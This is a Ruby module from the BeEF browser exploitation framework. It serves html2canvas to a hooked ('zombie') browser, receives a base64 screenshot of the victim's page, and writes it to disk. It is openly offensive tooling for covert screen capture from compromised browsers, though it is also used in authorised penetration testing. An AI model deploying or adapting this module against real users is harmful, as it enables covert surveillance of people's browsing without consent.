#
# Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Spyder_eye < BeEF::Core::Command
  require 'base64'

  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/browser/spyder_eye/html2canvas.js', '/html2canvas', 'js')
  end

  def post_execute 
    content = {}
    content['results'] = @datastore['results'] if not @datastore['results'].nil?
    save content

    # save screenshot file
    begin
      filename = "screenshot_#{Integer(@datastore['cid'])}.png"
      File.open(filename, 'wb') do |file|
        data = @datastore['results'].gsub(/^image=data:image\/(png|jpg);base64,/, "")
        file.write(Base64.decode64(data))
      end
      print_info("Browser screenshot saved to '#{filename}'")
      BeEF::Core::Logger.instance.register("Zombie", "Browser screenshot saved to '#{filename}'")
    rescue => e
      print_error("Could not write screenshot file '#{filename}' - Exception: #{e.message}")
    end

    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/html2canvas.js')
  end

end

